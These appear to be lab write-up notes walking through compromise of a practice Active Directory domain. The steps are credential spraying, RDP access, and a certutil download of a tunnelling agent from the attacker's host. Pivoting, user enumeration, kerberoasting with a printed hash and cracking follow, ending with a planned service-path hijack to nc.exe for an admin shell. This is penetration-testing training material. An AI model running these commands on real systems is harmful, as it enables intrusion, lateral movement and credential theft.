Start with target and domain discovery. Add ip to ips list
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5]
└─$ netexec smb 192.168.101.0/24
SMB         192.168.101.114 445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/writeups/ad/AD5]
└─$ cd loot 
                                                        
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ echo '192.168.101.114' > ips

```
![[Pasted image 20260813121843.png]]

Spray the creds and we have RDP on client1
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ nxc-sweep 192.168.101.114 -u emiller -p 'raymond1:P'
[*] Starting NXC sweep for 192.168.101.114 as emiller ...

[+] Port 445 open. Checking smb ...                                                                                                                                                                               
SMB         192.168.101.114 445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)                                         
SMB         192.168.101.114 445    CLIENT-1         [+] hack-academy.local\emiller:raymond1:P 
SMB         192.168.101.114 445    CLIENT-1         [*] Enumerated shares
SMB         192.168.101.114 445    CLIENT-1         Share           Permissions     Remark
SMB         192.168.101.114 445    CLIENT-1         -----           -----------     ------
SMB         192.168.101.114 445    CLIENT-1         ADMIN$                          Remote Admin
SMB         192.168.101.114 445    CLIENT-1         C$                              Default share
SMB         192.168.101.114 445    CLIENT-1         IPC$            READ            Remote IPC

[-] Port 5985 closed/filtered. Skipping winrm

[+] Port 3389 open. Checking rdp ...                                                                                                                                       
RDP         192.168.101.114 3389   CLIENT-1         [*] Windows 10 or Windows Server 2016 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) (nla:True)                                                      
RDP         192.168.101.114 3389   CLIENT-1         [+] hack-academy.local\emiller:raymond1:P (Pwn3d!)

```
![[Pasted image 20260813122129.png]]

RDP:
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /u:'emiller' /p:'raymond1:P' /v:192.168.101.114

```
![[Pasted image 20260813122231.png]]

Windows emiller:
``` sh
C:\Users\emiller>whoami
hack-academy\emiller

C:\Users\emiller>hostname
Client-1
```
![[Pasted image 20260813122258.png]]

Moved ligolo agent on target:
``` sh
PS C:\temp> certutil -urlcache -split -f "http://192.168.101.112:80/agent.exe" agent.exe
****  Online  ****
  000000  ...
  708400
CertUtil: -URLCache command completed successfully.
PS C:\temp> dir


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/13/2026   2:31 AM        7373824 agent.exe
-a----         8/13/2026   2:27 AM         600580 powerup.ps1
```
![[Pasted image 20260813123217.png]]

okay. setup ligolo
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ sudo ip link set tunnel1 up
                                                                                                        
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ sudo ip route add 10.0.2.0/24 dev tunnel1

                                                                                                        
┌──(kali㉿kali)-[~/pivot]
└─$ sudo ./proxy -selfcert
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.1

ligolo-ng » INFO[0008] Agent joined.                                 id=080027801d57 name="HACK-ACADEMY\\emiller@Client-1" remote="192.168.101.114:50211"
ligolo-ng » 
ligolo-ng » start --tun tunnel1
error: unknown command, try 'help'
ligolo-ng » start --tun tunnel1
error: please, select an agent using the session command
ligolo-ng » session
? Specify a session : 1 - HACK-ACADEMY\emiller@Client-1 - 192.168.101.114:50211 - 080027801d57
[Agent : HACK-ACADEMY\emiller@Client-1] » start --tun tunnel1
INFO[0039] Starting tunnel to HACK-ACADEMY\emiller@Client-1 (080027801d57) 
[Agent : HACK-ACADEMY\emiller@Client-1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
error: unknown command, try 'help'
[Agent : HACK-ACADEMY\emiller@Client-1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
INFO[0113] Listener 0 created on remote agent!          
[Agent : HACK-ACADEMY\emiller@Client-1] »  


```

windows:
``` c
PS C:\temp> .\agent.exe -connect 192.168.101.112:11601 -ignore-cert
time="2026-08-13T02:33:42-07:00" level=warning msg="warning, certificate validation disabled"
time="2026-08-13T02:33:42-07:00" level=info msg="Connection established" addr="192.168.101.112:11601"
```

Test to reach internal targets
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ netexec smb 10.0.2.0/24  

SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.2        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)

```
![[Pasted image 20260813123721.png]]

Get Domain users
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ netexec ldap 10.0.2.4 -u emiller -p raymond1:P --users 

LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\emiller:raymond1:P 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 13 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2025-12-31 22:28:42 0        Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 0        Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             emiller                       2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             snguyen                       2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             cturner                       2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             mreynolds                     2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             svc_web                       2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             nperez                        2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             valvarez                      2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             ksimmons                      2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             pprice                        2026-01-01 22:31:44 0                                                                    
LDAP        10.0.2.4        389    DC01             lromero                       2026-01-01 22:31:44 0
```
![[Pasted image 20260813123918.png]]

and add them to usernames list
![[Pasted image 20260813124015.png]]

Use bloodhound to collect data of domain
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ bloodhound-python -u "emiller" -p 'raymond1:P' -d hack-academy.local -c all --zip -ns 10.0.2.4  
 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hack-academy.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.hack-academy.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 14 users
INFO: Found 53 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Client-2.hack-academy.local
INFO: Querying computer: Client-1.hack-academy.local
INFO: Querying computer: DC01.hack-academy.local
INFO: Done in 00M 01S
INFO: Compressing output into 20260813054103_bloodhound.zip

```
![[Pasted image 20260813124124.png]]

Boot bloodhound
``` sh
┌──(kali㉿kali)-[~/AD/bloodhound]
└─$ sudo ./bloodhound-cli up
[sudo] password for kali: 
```
![[Pasted image 20260813124225.png]]

Found kerberoastable user SVC_WEB
Kerberoastable users
![[Pasted image 20260813125019.png]]

Kerberoast SVC_WEB we got hash
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ impacket-GetUserSPNs -dc-ip 10.0.2.4 hack-academy.local/emiller -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName              Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------------------  -------  --------  --------------------------  ---------  ----------
HTTP/client-2.hack-academy.local  svc_web            2026-01-01 22:31:44.257479  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_web$HACK-ACADEMY.LOCAL$hack-academy.local/svc_web*$dcdd8f77f50105e636295e245d75a25b$c2a63191ea78f0a47c5ce22bedda776ba0d01120ce3c1350eb4ab0f873f055fba9415ac83a7d72a429b2fc4d388187df48714f977cd0507f50c84e678f1734676aab0c0ef164f63df04705c82e552cd187e35d9b9d19700111fa627ca90ccf76fef914389f0429edbc3f9c1fd796d1280fdbffc1bcfc4d56c7a1a041b4cbe2c9b3f0b6e374b456128abbe3813b747bc9959b2b54b728716ee056e5307d763d5f8c124abe080bf584dacce693d3915d6624667d6b5e5d4c06e27117132c5f353a4fa3cd98cf9fcfee0074cd7448eef6e4d0ebd3803f3b1fb4ddc52891a0a5cfb0005dfe6c22095f4dc87cd736cb70643f08e47eee9bba837f9f6f20d429d93fd8c4c165024e051c2c7e9707bcbeab1ea07743bc050b98ca58c3bb37be0c70b08283a55669617f0148208ddb81cd027535569169bddc4d7752c7277253eac4f69de22da2963050fe43f402cb7ca2967786076e05df67b97a0b5430ecf8d6a945efdcc417bba8c43da30dbf57a2a63c2336cf0ecc535cf38955b5f39f463f318cdbba61172beac20c451401bbab5d17a801906ab6b2039815d4aaad34dd922c25ec6a6b3d476d75fb759228913b15b0417bdf942d6c11642393c207e56c7d842ed745555ed8c10aec01acc41deb1c175e4065589fd795d0da4e38c7b5e2c855a49cd5552713222efa3f7a9e2a726cbf24f5aa8bc4d354d0968a7973f4d319aeb737df0f5068cac5d729ff4371e0fe77693f76ab850396c6d2c960833d446e1dc557b56b51d484700e801f3713840fb3764c8aa6e67f088957b642772adfddcd959a0d0f3ddb1a53257ed8e2201523592c62883d86a94794d8cd67c8e1e9916ea847c2b12ea25a714b8950a5c61b27b8d3dc6140a7cf8cfc10bc8fcbd7c2b6c4df6e3e60d6976a38988d54a13a7b10c416c740bf40e5033de3cd702211d57f7f6c7d7ef4fe9ba48ec06c908f20f597e924de1d56aebb6663189b0291157abab7b83ca5e8f9317944db784b32fd92d19ef583f2ba98397ef5df898deb8b430c02d18970027a6375aee5749aa9aebdf2287173fe1bd1b35a58923c11f8ed8366203956473dfd2faaf9fcf5cbb72e82f918360d6774326061d17c69601416567dc6471c1f59cea769ef9bac5a462a05aed1a04f87f4f51c0803ea57a2b5a0c8c14350f534c992444606ea73cbcd15b7fb76d9122ad852b3c8e576cc4f9a5d7d04fb266404631f9d71974ef58301160d1f6b6c898abcbb525e99fc9d3e63ebb0df8e713c43366e42a23132e6e1b4a03508ee11ec6d894f277f49178f46bc5ce9b5ebca53dcf44eb5a7d11cbc9861ba25faa29251f38f50abd778f0526ed4fc5a9522afdd8a45732b38a5537390670be12d0251566c5e419ffeac126d0508ac8286dedea9fda862f70578fcc64b69791cfac2d768449b5f7729c535269e2afc2f964bd5105da7f46e6802c438403f
```
![[Pasted image 20260813125544.png]]

Crack it with john the ripper
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ john hash_svcweb --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
oDr@gon13        (?)     
```
![[Pasted image 20260813125700.png]]

Spray the creds. Got winrm on Client2
``` c
┌──(kali㉿kali)-[~/writeups/ad/AD5/loot]
└─$ netexec winrm ips -u usernames -p passwords                                 
[*] Initializing WINRM protocol database

<REDACTED>

WINRM       10.0.2.9        5985   CLIENT-2         [+] hack-academy.local\svc_web:oDr@gon13 (Pwn3d!)

```

No interesting access rights in bloodhound
Privesccheck:
``` sh
Name              : AgentSvc
DisplayName       :
User              : LocalSystem
ImagePath         : 'C:\Program Files\Tride Agent\AgentService.exe'
StartMode         : Automatic
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\AgentSvc
Status            : Stopped
UserCanStart      : False
UserCanStop       : False
IdentityReference : Everyone (S-1-1-0)
Permissions       : AllAccess

[*] Status: Vulnerable - Severity: High - Execution time: 00:00:05.172
```

okay run accesschecc64 to check the AgentSvc privs and exploit to change its executable path to nc.exe to get admin shell

dump hashes

etc etc.